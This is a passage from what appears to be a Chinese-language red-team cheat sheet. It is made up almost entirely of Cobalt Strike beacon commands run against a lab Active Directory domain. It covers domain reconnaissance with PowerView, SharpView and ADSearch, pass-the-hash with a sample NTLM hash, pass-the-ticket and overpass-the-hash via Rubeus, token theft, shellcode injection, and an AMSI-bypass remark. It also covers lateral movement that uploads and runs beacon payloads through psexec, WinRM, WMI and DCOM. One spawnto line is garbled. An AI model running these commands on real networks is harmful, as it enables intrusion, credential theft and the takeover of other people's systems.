class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Load Powerview powershell script in Beacon Session (Cobalt Strike)</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\PowerSploit\Recon\PowerView.ps1<br><br><span class="hljs-comment"># Get Domain Information</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-Domain</span> <span class="hljs-literal">-Domain</span> &lt;&gt;<br><br><span class="hljs-comment"># Get Domain SID</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainSID</span><br><br><span class="hljs-comment"># Get Domain Controller</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainController</span> | <span class="hljs-built_in">select</span> Forest, Name, OSVersion | <span class="hljs-built_in">fl</span><br><br><span class="hljs-comment"># Get Forest Information</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-ForestDomain</span> <span class="hljs-literal">-Forest</span> &lt;&gt;<br><br><span class="hljs-comment"># Get Domain Policy </span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainPolicyData</span> | <span class="hljs-built_in">select</span> <span class="hljs-literal">-expand</span> SystemAccess<br><br><span class="hljs-comment"># Get Domain users</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> jking <span class="hljs-literal">-Properties</span> DisplayName, MemberOf | <span class="hljs-built_in">fl</span><br><br><span class="hljs-comment"># Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> | <span class="hljs-built_in">select</span> cn,serviceprincipalname<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-PreauthNotRequired</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-TrustedToAuth</span><br><br><span class="hljs-comment"># Get Domain Computer</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Properties</span> DnsHostName | <span class="hljs-built_in">sort</span> <span class="hljs-literal">-Property</span> DnsHostName<br><br><span class="hljs-comment"># Idenitify Computer Accounts where unconstrained and constrained delegation is enabled</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Unconstrained</span> | <span class="hljs-built_in">select</span> cn, dnshostname<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-TrustedToAuth</span> | <span class="hljs-built_in">select</span> cn, msdsallowedtodelegateto<br><br><span class="hljs-comment"># Get Domain OU</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainOU</span> <span class="hljs-literal">-Properties</span> Name | <span class="hljs-built_in">sort</span> <span class="hljs-literal">-Property</span> Name<br><br><span class="hljs-comment"># Identify computers in given OU</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-SearchBase</span> <span class="hljs-string">&quot;OU=Workstations,DC=dev,DC=cyberbotic,DC=io&quot;</span> | <span class="hljs-built_in">select</span> dnsHostName<br><br><span class="hljs-comment"># Get Domain group (Use -Recurse Flag)</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroup</span> | <span class="hljs-built_in">where</span> Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*Admins*&quot;</span> | <span class="hljs-built_in">select</span> SamAccountName<br><br><span class="hljs-comment"># Get Domain Group Member</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> | <span class="hljs-built_in">select</span> MemberDistinguishedName<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-Recurse</span> | <span class="hljs-built_in">select</span> MemberDistinguishedName<br><br><span class="hljs-comment"># Get Domain GPO</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGPO</span> <span class="hljs-literal">-Properties</span> DisplayName | <span class="hljs-built_in">sort</span> <span class="hljs-literal">-Property</span> DisplayName<br><br><span class="hljs-comment"># Find the System where given GPO are applicable</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainOU</span> <span class="hljs-literal">-GPLink</span> <span class="hljs-string">&quot;&#123;AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F&#125;&quot;</span> | <span class="hljs-built_in">select</span> distinguishedName<br><br><span class="hljs-comment"># Idenitfy domain users/group who have local admin via Restricted group or GPO </span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGPOLocalGroup</span> | <span class="hljs-built_in">select</span> GPODisplayName, GroupName<br><br><span class="hljs-comment"># Enumerates the machines where a specific domain user/group has local admin rights</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGPOUserLocalGroupMapping</span> <span class="hljs-literal">-LocalGroup</span> Administrators | <span class="hljs-built_in">select</span> ObjectName, GPODisplayName, ContainerName, ComputerName | <span class="hljs-built_in">fl</span><br><br><span class="hljs-comment"># Get Domain Trusts</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainTrust</span><br><br><span class="hljs-comment"># Find interesting ACLs</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-InterestingDomainAcl</span> <span class="hljs-literal">-ResolveGUIDs</span><br><br><span class="hljs-comment"># ----------------------------------------------------------------------------</span><br><br><span class="hljs-comment"># Find Local Admin Access on other domain computers based on context of current user</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-LocalAdminAccess</span> <span class="hljs-literal">-Verbose</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-CheckLocalAdminAccess</span> <span class="hljs-literal">-ComputerName</span> &lt;server_fqdn&gt;<br><span class="hljs-comment"># Not available in Powerview , need scripts Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-PSRemotingLocalAdminAccess</span> <span class="hljs-literal">-ComputerName</span> &lt;server_fqdn&gt;<br>beacon&gt; powerpick <span class="hljs-built_in">Find-WMILocalAdminAccess</span> <span class="hljs-literal">-ComputerName</span> &lt;server_fqdn&gt;<br><br><span class="hljs-comment"># Check for computers where users or domain admin may have logged in sessions</span><br><span class="hljs-comment"># Find computers where a domain admin (or specified user/group) has sessions</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-DomainUserLocation</span> <span class="hljs-literal">-Verbose</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-DomainUserLocation</span> <span class="hljs-literal">-UserGroupIdentity</span> <span class="hljs-string">&quot;Domain Users&quot;</span><br><span class="hljs-comment"># Find computers where a domain admin session is available and current user has admin access (uses `Test-AdminAccess`). -CheckAccess Flag Sometimes not gives accurate results with Find-DomainUserLocation , So use Invoke-UserHunter.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-UserHunter</span> <span class="hljs-literal">-CheckAccess</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-DomainUserLocation</span> <span class="hljs-literal">-CheckAccess</span><br><span class="hljs-comment"># Find computers (File Servers and Distributed File servers) where a domain admin session is available.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-DomainUserLocation</span> –Stealth<br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-StealthUserHunter</span><br><br><span class="hljs-comment"># Finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-UserHunter</span> <span class="hljs-literal">-CheckAccess</span><br><span class="hljs-comment"># Finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users    </span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-StealthUserHunter</span><br><span class="hljs-comment"># Hunts for processes with a specific name or owned by specific user on domain machines</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-ProcessHunter</span><br><span class="hljs-comment"># Hunts for user logon events in domain controller event logs</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-UserEventHunter</span><br><br><span class="hljs-comment"># Find shares on hosts in current domain.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-ShareFinder</span> –Verbose<br><span class="hljs-comment"># Find sensitive files on computers in the domain</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-FileFinder</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># Get all fileservers of the domain</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-NetFileServer</span><br></code></pre></td></tr></table></figure>

<ul>
<li>使用 SharpView 二进制文件进行域侦察</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe <span class="hljs-built_in">Get-Domain</span><br></code></pre></td></tr></table></figure>

<ul>
<li>使用 ADSearch 进行域侦察</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell">beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;objectCategory=user&quot;</span><br><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=group)(cn=*Admins*))&quot;</span><br><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=group)(cn=MS SQL Admins))&quot;</span> <span class="hljs-literal">--attributes</span> cn,member<br><br><span class="hljs-comment"># Kerberostable Users</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=user)(servicePrincipalName=*))&quot;</span> <span class="hljs-literal">--attributes</span> cn,servicePrincipalName,samAccountName<br><br><span class="hljs-comment"># ASEPROAST</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</span> <span class="hljs-literal">--attributes</span> cn,distinguishedname,samaccountname<br><br><span class="hljs-comment"># Unconstrained Delegation</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-literal">--attributes</span> samaccountname,dnshostname<br><br><span class="hljs-comment"># Constrained Delegation</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-literal">--attributes</span> dnshostname,samaccountname,msds<span class="hljs-literal">-allowedtodelegateto</span> <span class="hljs-literal">--json</span><br><br><span class="hljs-comment"># Additionally, the `--json` parameter can be used to format the output in JSON</span><br></code></pre></td></tr></table></figure>

<h3 id="用户模拟"><a href="#用户模拟" class="headerlink" title="用户模拟"></a>用户模拟</h3><ul>
<li>传递哈希攻击 (PTH)</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">beacon&gt; getuid<br>beacon&gt; <span class="hljs-built_in">ls</span> \\web.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br><br><span class="hljs-comment"># PTH using inbuild method in CS (internally uses Mimikatz)</span><br>beacon&gt; pth DEV\jking <span class="hljs-number">59</span>fc0f884922b4ce376051134c71e22c<br><br><span class="hljs-comment"># Find Local Admin Access</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-LocalAdminAccess</span><br><br>beacon&gt; rev2self<br></code></pre></td></tr></table></figure>

<ul>
<li>传递票证攻击 (PTT)</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Create a sacrificial token with dummy credentials</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123<br><br><span class="hljs-comment"># Inject the TGT ticket into logon session returned as output of previous command</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:<span class="hljs-number">0</span>x798c2c /ticket:doIFuj[<span class="hljs-type">...snip...</span>]lDLklP<br><br><span class="hljs-comment"># OR Combine above 2 steps in one</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[<span class="hljs-type">...snip...</span>]lDLklP <br><br>beacon&gt; steal_token <span class="hljs-number">4748</span><br>beacon&gt; token<span class="hljs-literal">-store</span> steal <span class="hljs-number">4748</span><br><br><span class="hljs-comment"># Now check access by trying to list the c: drive</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\web.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>

<ul>
<li>OverPassTheHash（OPTH）</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Using rc4 NTLM Hash</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:<span class="hljs-number">59</span>fc0f884922b4ce376051134c71e22c /nowrap<br><br><span class="hljs-comment"># Using aes256 hash for better opsec, along with /domain (Use NetBios name &quot;DEV&quot; not FQDN &quot;dev.cyberbotic.io&quot;) and /opsec flags (better opsec)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:<span class="hljs-number">4</span>a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap<br><br><span class="hljs-comment"># Using username and password to obtain TGT</span><br><span class="hljs-comment"># We can use Rubeus Hash Functionality to calculate hash from the credentials</span><br><span class="hljs-comment"># Calculate Hash of the random password, So we can use it to get TGT.</span><br>cmd&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer<span class="hljs-variable">$</span> /domain:dev.cyberbotic.io<br><span class="hljs-comment"># Alternatively we can use make_token in Cobalt Strike</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /password:&lt;password&gt; /enctype:&lt;des|aes128|aes256|rc4(default)&gt; /domain:DEV /opsec /nowrap<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:mssql_svc /password:Cyberb0tic /enctype:rc4 /domain:DEV /nowrap<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer<span class="hljs-variable">$</span> /aes256:<span class="hljs-number">7</span>A79D...<span class="hljs-number">44</span> /nowrap<br><br><span class="hljs-comment"># Now using this TGT perform PTT attack</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[<span class="hljs-type">...snip...</span>]lDLklP<br><br>beacon&gt; steal_token <span class="hljs-number">4748</span><br>beacon&gt; token<span class="hljs-literal">-store</span> steal <span class="hljs-number">4748</span><br><br><span class="hljs-comment"># Now we can check for LocalAdminAccess and then Move Laterally.</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Find-LocalAdminAccess</span> <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>

<ul>
<li>令牌模拟、令牌存储、制作令牌和进程注入</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># steal access token from another process using steal_token</span><br>beacon&gt; steal_token &lt;PID&gt;<br><br><span class="hljs-comment"># Drop the impersonation (Revert to ourself)</span><br>beacon&gt; rev2self<br><br><span class="hljs-comment"># Storing and managing stolen access tokens using token-store</span><br><span class="hljs-comment"># Steal a token from a Process and add it to token store</span><br>beacon&gt; token<span class="hljs-literal">-store</span> steal <span class="hljs-number">5536</span><br><span class="hljs-comment"># List all stored tokens</span><br>beacon&gt; token<span class="hljs-literal">-store</span> show<br><span class="hljs-comment"># Impersonating a Stored Token</span><br>beacon&gt; token<span class="hljs-literal">-store</span> use &lt;id&gt;<br><span class="hljs-comment"># Drop the impersonation</span><br>beacon&gt; rev2self<br><span class="hljs-comment"># Removing a Single Token or Flushing all tokens</span><br>beacon&gt; token<span class="hljs-literal">-store</span> remove &lt;id&gt;<br>beacon&gt; token<span class="hljs-literal">-store</span> <span class="hljs-built_in">remove-all</span><br><br><span class="hljs-comment"># Impersonating Domain User with Credentials using make_token (make_token = runas /netonly)</span><br><span class="hljs-comment"># The logon session created with LogonUserA API (make_token) has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource.</span><br>beacon&gt; make_token DEV\jking &lt;Password&gt;<br><br><span class="hljs-comment"># Process Injection</span><br><span class="hljs-comment"># `shinject` allows you to inject any arbitrary shellcode from a binary file on your attacking machine</span><br>beacon&gt; shinject &lt;PID&gt; &lt;x86|x64&gt; /path/to/binary.bin<br><span class="hljs-comment"># `inject` will inject a full Beacon payload for the specified listener.</span><br>beacon&gt; inject <span class="hljs-number">4464</span> x64 tcp<span class="hljs-literal">-local</span><br></code></pre></td></tr></table></figure>

<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># using Jump</span><br><span class="hljs-comment">## This will spawn a Beacon payload on the remote target, and if using a P2P listener, will connect to it automatically.</span><br><span class="hljs-comment"># Malleable C2 amsi_disable does not applies to Cobalt Strike Jump Command, So some methods in jump command which uses Powershell like psexec_psh , winrm and winrm64 will not work if payload is detected, So we musty have to use Custom AMSI Bypass script to avoif that and get a shell.</span><br><span class="hljs-comment"># To make the jump command work and include amsi bypass into it, We need to modify the Resource kit&#x27;s template.x86.ps1 (for winrm), template.x64.ps1 (for winrm64) and compress.ps1 (for psexec_psh).</span><br><span class="hljs-comment"># To learn more , Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/</span><br>beacon&gt; jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener<br><br><span class="hljs-comment"># Using remote exec</span><br><span class="hljs-comment">## You also need to connect to P2P Beacons manually using connect or link.</span><br>beacon&gt; remote<span class="hljs-literal">-exec</span> psexec/winrm/wmi ComputerName &lt;uploaded binary on remote system&gt;<br><span class="hljs-comment"># To execute commands</span><br>beacon&gt; remote<span class="hljs-literal">-exec</span> winrm ComputerName &lt;execute commands&gt;<br><span class="hljs-comment">#--------------------------------------------------------------</span><br><span class="hljs-comment"># Using PSExec (Requires TGS for CIFS)</span><br><span class="hljs-comment">## Make sure to change the Post-Ex process for Psexec which is Rundll32.exe by default and even Malleable c2&#x27;s Post-Ex don&#x27;t help here , So we have to do it manually using spawnto.</span><br>beacon&gt; ak<span class="hljs-literal">-settings</span><br>beacon&gt; spawnto x64 %windir%\sysnative\dllhost.exe<br>beacon&gt; spawnto x86 %windir%\syswrun klist ow64\dllhost.exe<br><br>beacon&gt; jump psexec64 web.dev.cyberbotic.io smb<br>beacon&gt; jump psexec_psh web.dev.cyberbotic.io smb<br><br>beacon&gt; <span class="hljs-built_in">cd</span> \\web.dev.cyberbotic.io\ADMIN<span class="hljs-variable">$</span><br>beacon&gt; upload C:\Payloads\smb_x64.exe<br>beacon&gt; remote<span class="hljs-literal">-exec</span> psexec web.dev.cyberbotic.io C:\Windows\smb_x64.exe<br>beacon&gt; remote<span class="hljs-literal">-exec</span> psexec sql<span class="hljs-literal">-2</span> powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;C:\Windows\smb_x64.exe&#x27;</span><br>beacon&gt; link web.dev.cyberbotic.io TSVCPIPE<span class="hljs-literal">-81180acb-0512-44d7-81fd-fbfea25fff10</span><br><span class="hljs-comment">## Then use powerpick to get its own process name, it will return dllhost.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-Id</span> <span class="hljs-variable">$pid</span> | <span class="hljs-built_in">select</span> ProcessName<br><br><span class="hljs-comment">#-------------------------------------------------------------------------------------</span><br><span class="hljs-comment"># Example Windows Remote Management (WinRM) - (Requires TGS for HOST &amp; HTTP)</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\web.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br>beacon&gt; jump winrm64 web.dev.cyberbotic.io smb<br>beacon&gt; jump winrm web.dev.cyberbotic.io smb<br><br>beacon&gt; <span class="hljs-built_in">cd</span> \\web.dev.cyberbotic.io\c<span class="hljs-variable">$</span>\ProgramData<br>beacon&gt; upload C:\Payloads\smb_x64.exe<br>beacon&gt; remote<span class="hljs-literal">-exec</span> winrm web.dev.cyberbotic.io C:\Windows\smb_x64.exe<br>beacon&gt; remote<span class="hljs-literal">-exec</span> winrm sql<span class="hljs-literal">-2</span> powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;C:\Windows\smb_x64.exe&#x27;</span><br>beacon&gt; link web.dev.cyberbotic.io TSVCPIPE<span class="hljs-literal">-81180acb-0512-44d7-81fd-fbfea25fff1</span><br><span class="hljs-comment">#-------------------------------------------------------------------------------------</span><br><span class="hljs-comment"># Example Windows Management Instrumentation (WMI) - (Requires TGS for HOST &amp; RPCSS)</span><br><span class="hljs-comment"># If gets COM Error try to upload the binary to directory where user may have access</span><br>beacon&gt; <span class="hljs-built_in">cd</span> \\web.dev.cyberbotic.io\c<span class="hljs-variable">$</span>\ProgramData<br>beacon&gt; upload C:\Payloads\smb_x64.exe<br>beacon&gt; remote<span class="hljs-literal">-exec</span> wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe<br>beacon&gt; remote<span class="hljs-literal">-exec</span> wmi sql<span class="hljs-literal">-2</span> powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;C:\Windows\smb_x64.exe&#x27;</span><br>beacon&gt; link web.dev.cyberbotic.io TSVCPIPE<span class="hljs-literal">-81180acb-0512-44d7-81fd-fbfea25fff10</span><br><br><span class="hljs-comment"># Using SharpWMI</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> c:\Tools\Ghostpack<span class="hljs-literal">-CompiledBinaries</span>\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command=<span class="hljs-string">&quot;C:\Windows\smb_beacon2.exe&quot;</span><br>beacon&gt; link WINTERFELL msagent_eb<br><br><span class="hljs-comment">#-------------------------------------------------------------------------------------</span><br><span class="hljs-comment"># Executing .Net binary remotely</span><br><span class="hljs-comment">## Some of Seatbelt&#x27;s commands can also be run remotely, which can be useful enumerating its configurations and defences before jumping to it.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo <span class="hljs-literal">-ComputerName</span>=web<br><br><span class="hljs-comment">#--------------------------------------------------------------------------------------</span><br><span class="hljs-comment"># Invoke DCOM (better opsec) (Requires TGS for RPCSS)</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\<span class="hljs-built_in">Invoke-DCOM</span>.ps1<br>beacon&gt; <span class="hljs-built_in">cd</span> \\web.dev.cyberbotic.io\ADMIN<span class="hljs-variable">$</span><br>beacon&gt; upload c:\Payloads\smb_x64.exe<br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-DCOM</span> <span class="hljs-literal">-ComputerName</span> web.dev.cyberbotic.io <span class="hljs-literal">-Method</span> MMC20.Application <span class="hljs-literal">-Command</span> C:\Windows\smb_x64.exe<br>beacon&gt; link web.dev.cyberbotic.io agent_vinod<br><br><span class="hljs-comment">#--------------------------------------------------------------------------------------</span><br><span class="hljs-comment">## NOTE: While using remote-exec for lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary for execution</span><br></code></pre></td></tr></table></figure>

